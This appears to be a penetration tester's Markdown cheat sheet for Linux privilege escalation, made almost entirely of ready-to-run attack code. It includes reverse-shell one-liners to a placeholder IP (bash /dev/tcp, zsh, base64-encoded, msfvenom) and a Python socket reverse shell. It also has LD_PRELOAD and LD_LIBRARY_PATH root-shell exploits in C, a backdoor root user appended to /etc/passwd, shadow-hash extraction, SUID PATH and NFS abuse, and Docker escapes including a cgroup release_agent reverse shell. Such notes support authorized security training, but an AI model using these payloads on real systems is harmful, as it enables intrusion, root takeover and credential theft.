# Linux privilege escalation
   * [Utilities](#utilities)
      * [Shell stabilization and interactivity](#shell-stabilization-and-interactivity)
      * [Useful reverse shells](#useful-reverse-shells)
      * [Port tunneling](#port-tunneling)
      * [Copy files from/to the target](#copy-files-fromto-the-target)
   * [Autoenumeration <em>(LinPEAS)</em>](#autoenumeration-linpeas)
   * [Monitoring processes <em>(PSPY)</em>](#monitoring-processes-pspy)
   * [Autoenumeration <em>(Linux Smart Enumeration)</em>](#autoenumeration-linux-smart-enumeration)
   * [Linux Exploit Suggester](#linux-exploit-suggester)
   * [Manual enumeration](#manual-enumeration)
      * [Users and groups](#users-and-groups)
      * [System info](#system-info)
      * [Periphery](#periphery)
      * [SUID/SGID programs](#suidsgid-programs)
      * [Services and jobs](#services-and-jobs)
      * [Files and folders](#files-and-folders)
   * [Possible escalation vectors in programs](#possible-escalation-vectors-in-programs)
   * [Compiling exploits and tools](#compiling-exploits-and-tools)
   * [Readable /etc/shadow exploit](#readable-etcshadow-exploit)
   * [Writable /etc/passwd or /etc/shadow exploit](#writable-etcpasswd-or-etcshadow-exploit)
   * [Exploiting wildcards](#exploiting-wildcards)
   * [Modifying $PATH for SUID programs](#modifying-path-for-suid-programs)
   * [Python library hijacking](#python-library-hijacking)
   * [LD_PRELOAD exploit](#ld_preload-exploit)
   * [LD_LIBRARY_PATH exploit](#ld_library_path-exploit)
   * [Compiling shared library running bash shell](#compiling-shared-library-running-bash-shell)
   * [Compile service running bash shell](#compile-service-running-bash-shell)
   * [Permissions modification in NFS](#permissions-modification-in-nfs)
   * [Escaping a Docker privileged container <em>(mounting host file system)</em>](#escaping-a-docker-privileged-container-mounting-host-file-system)
   * [Escaping a Docker privileged container <em>(reverse shell using cgroup)</em>](#escaping-a-docker-privileged-container-reverse-shell-using-cgroup)

## Utilities
### Shell stabilization and interactivity
- Listen to reverse shell:
```bash
sudo rlwrap nc -lvnp 443
```
- Upgrade the shell:
```bash
python -c 'import pty;pty.spawn("/bin/bash")' # Explicit python version may be required.
```

### Useful reverse shells
- Reverse shell oneliners:
```bash
bash -i >& /dev/tcp/<ip>/443 0>&1 # bash
bash -c "bash -i >& /dev/tcp/<ip>/443 0>&1" # sh or dash
zsh -c 'zmodload zsh/net/tcp && ztcp <ip> 443 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY' # zsh
```
- Reverse shell encoded oneliner:
```bash
echo "bash -c 'bash -i >& /dev/tcp/<ip>/443 0>&1'" | base64
echo '<payload>' | base64 --decode | bash
```
- TCP reverse shell executable:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=443 -f elf > shell.elf
```

### Port tunneling
```bash
ssh -L <local_port>:localhost:<port> <target_username>@<target_ip> # Run on kali to forward a blocked port
```

### Copy files from/to the target
- SCP:
```bash
scp <username>@<ip>:<filename_in_user_directory> .
scp <filename> <username>@<ip>:<path>
```
- FTP:
```bash
python3 -m pyftpdlib -w -p 2121
```
```cmd
ftp # anonymous and empty pass
open <ip> 2121
put <some_local_file>
```
- HTTP:
```bash
sudo python3 -m http.server 80

wget http://<my_ip>/<filename>
curl http://<my_ip>/<filename> --output <filename>
```

## Autoenumeration _(LinPEAS)_
- Prepare:
```bash
cp ~/pentesting-tools/linpeas_3.1.5_safe_oscp/linpeas.sh ./linpeas.sh
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```bash
./linpeas.sh > linpeas.txt
./linpeas.sh -a > linpeas.txt # Full search
less -r linpeas.txt
```

## Monitoring processes _(PSPY)_
- Prepare:
```bash
cp ~/pentesting-tools/pspy_1.2.0/pspy32 ./pspy32
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```bash
./pspy32 # Needs process interrupt key to stop
```

## Autoenumeration _(Linux Smart Enumeration)_
- Prepare:
```bash
cp ~/pentesting-tools/lse_3.1/lse.sh ./lse.sh
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```bash
./lse.sh -i -l0 # Default level of information. Increase it up to 2 if nothing is found
```

## Linux Exploit Suggester
- Prepare:
```bash
cp ~/pentesting-tools/les_1.1/les.sh ./les.sh
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```bash
./les.sh
```

## Manual enumeration
### Users and groups
- Users and groups:
```bash
whoami
cat /etc/passwd
```
```bash
groups
cat /etc/group
```
- `sudo` user privileges :
```bash
sudo -l  # Don't forget to notice env_keep or SETENV options
```
- Capabilities _(Looking for `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `DAC_READ_SEARCH`, `DAC_OVERRIDE`)_:
```bash
capsh --print
```
- Commands history:
```bash
cat ~/.*history
```

### System info
- Kernel version _(better check all other options before using kernel exploits)_:
```bash
uname -a
```
- OS version:
```bash
cat /etc/os-release
```

### Periphery
- Open ports:
```bash
ss -tulpn
nc -z -v 127.0.0.1 20-80 # If nc is available
```
- Check listening port _(there may be no output for root processes)_:
```bash
lsof -i :<port>
```
- NFS shares:
```bash
cat /etc/exports # Check if no_root_squash is set
```
- Devices:
```bash
fdisk -l
```

### SUID/SGID programs
- SUID/SGID programs:
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null # SUID and SGID with permissions
find / -perm -u=s -type f 2>/dev/null # SUID only
find / -perm -g=s -type f 2>/dev/null # SGID only
```
- Examine custom programs:
```bash
ls -l <program_name>
cat <program_name>
strings <program_name> # For binary files
```
- Shared libraries' usage in programs:
```bash
strace <program_name> 2>&1 | grep -iE "open|access|no such file"
```
- External program calls in programs:
```bash
strace -v -f -e execve <program_name> 2>&1 | grep exec
```

### Services and jobs
- Cron jobs:
```bash
cat /etc/crontab
ls -l /var/spool/cron
ls -l /var/spool/cron/crontab
```
- Examine custom programs run by cron jobs:
```bash
ls -l <cron_executable> 
cat <cron_executable>
strings <cron_executable> # For binary files.
```
- Services running by the root user:
```bash
ps aux | grep "^root"
```

### Files and folders
- Permissions of important files:
```bash
ls -l /etc/passwd
ls -l /etc/shadow
ls -l /etc/sudoers
```
- ACL of suspicious files _(you may have special permissions sometimes)_:
```bash
getfacl <file_path>
```
- List files in common folders:
```bash
ls -la ~
ls -la /tmp
ls -la /opt
ls -la /opt/backup
ls -la /usr/local
ls -la /var/backups
ls -la /var/logs
```
- Search for strings in the file that don't start with `# ` _(useful for config files)_:
```bash
cat <filename> | grep -v "^# "
```
- Search files _(for example, files contain target username, or technology)_:
```bash
grep -rnw '/' -e '<search_query>' 2> /dev/null
```
- As the very last step, try to search for all .txt files _(maybe, somebody left dangerous info somewhere)_:
```bash
locate *.txt
find / -type f -name "*.txt" 2>/dev/null
```

## Possible escalation vectors in programs
- https://gtfobins.github.io/

## Compiling exploits and tools
- Use this to compile exploits and tools if no specific instructions provided:
```bash
gcc <file> -o <output_file> # add -fPIC for 64-bit machines
g++ <file> -o <output_file>
```
- If a target machine doesn't have required tools to compile an exploit cross-compile it on Kali _(add `-m32` option for 32-bit machines)_.

## Readable /etc/shadow exploit
- Just read the hash.
- Or use `unshadow` _(on target or personal machine)_:
```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt
```

## Writable /etc/passwd or /etc/shadow exploit
- Create a password:
```bash
openssl passwd -1 -salt <salt_like_username> <password>
```
- Or use this prepared user:
```bash
echo "new:\$1\$new\$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash" >> /etc/passwd
```
- Switch to the new user:
```bash
su new # password:123
```

## Exploiting wildcards
- Check options for the command that uses the wildcard: https://gtfobins.github.io/gtfobins/
- Create files in the current directory with filenames as options:
```bash
touch ./--<command_option>
```

## Modifying `$PATH` for SUID programs
- Make alternative command which runs privileged bash:
```bash
echo "/bin/bash -p" > /tmp/<command>
chmod +x /tmp/<command>
```
- Modify `$PATH`:
```bash
export PATH=/tmp:$PATH # To start searching for the <command> in /tmp first
```
- Or run program and pass `$PATH` to it:
```bash
PATH=/tmp:$PATH <program_name>
```

## Python library hijacking
- Check library loading locations order:
```bash
python -c 'import sys; print "\n".join(sys.path)' # The first empty one is the current dir
```
- Create required library copy keeping the same class/method signature and populate with the reverse shell code:
```python
import os
import pty
import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<ip>",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```
- Put code in the proper location if possible.
- Or modify PYTHONPATH env variable if sudo SETENV is set:
```bash
sudo PYTHONPATH=/tmp/ /usr/bin/<some_python> <some_vulnerable_python_script>
```

## `LD_PRELOAD` exploit
- If `env_keep+=LD_PRELOAD` is set, use this exploit.
- `ld_preload_exploit.c`:
```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
- Compile it:
```bash
gcc -shared -fPIC -nostartfiles -o /tmp/ld_preload.so ld_preload_exploit.c
```
- Run sudo program with `LD_PRELOAD`:
```bash
sudo LD_PRELOAD=/tmp/ld_preload.so <sudo_program>
```

## `LD_LIBRARY_PATH` exploit
- If `env_keep+=LD_LIBRARY_PATH` is set use this exploit.
- Pick the shared library to replace:
```bash
ldd <sudo_program>
```
- `ld_library_path_exploit.c`:
```C
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor))

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```
- Compile it:
```bash
gcc -shared -fPIC -o ./<picked_library_name> ld_library_path_exploit.c
```
- Run sudo program with `LD_LIBRARY_PATH`:
```bash
sudo LD_LIBRARY_PATH=. <sudo_program>
```

## Compiling shared library running bash shell
- `bash_shared.c`:
```C
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```
- Compile it to the .so shared library file:
```bash
gcc -shared -fPIC -o <library_name>.so bash_shared.c
```

## Compile service running bash shell
- `bash_service.c`:
```C
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```
- Compile it to the service file:
```bash
gcc -o <service_name> bash_service.c
```

## Permissions modification in NFS
- Mount the NFS share:
```bash
mkdir /tmp/mounted_share
sudo mount -t nfs <ip>:<share_name> /tmp/mounted_share/ -nolock
```
- Prepare the shell:
```bash
sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/mounted_share/shell.elf
```
- Add permissions:
```bash
sudo chmod +xs /tmp/mounted_share/shell.elf
```
- Run bash from the low privileged user on the target machine:
```bash
./shell.elf
```

## Escaping a Docker privileged container _(mounting host file system)_
- If `fdisk -l` shows a Linux file system, it can be easily mounted:
```bash
mkdir /tmp/escape
mount /dev/<sda_name> /tmp/escape
```
- Generate an SSH key pair and print the public key:
```bash
ssh-keygen -t rsa -C "kali@<ip>"
# File path = ./id_rsa
cat id_rsa.pub
```
- Add it to `authorized_keys` on the target machine:
```bash
echo '<id_rsa_pub_key>' > ~/.ssh/authorized_keys
```
- SSH to the machine:
```bash
ssh -i ./id_rsa <user>@<host>
```

## Escaping a Docker privileged container _(reverse shell using cgroup)_
- Configure cgroup to run the command on the host after all processes are dead:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```
- Specify the file with commands:
```bash
echo "$host_path/cmd" > /tmp/cgrp/release_agenta
```
- Put the reverse shell into command file:
```bash
echo '#!/bin/sh' > /cmd
echo "bash -c 'bash -i >& /dev/tcp/<ip>/443 0>&1'" >> /cmd
chmod a+x /cmd
```
- Listen to the reverse shell:
```bash
sudo rlwrap nc -lvnp 443
```
- Execute the reverse shell:
```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
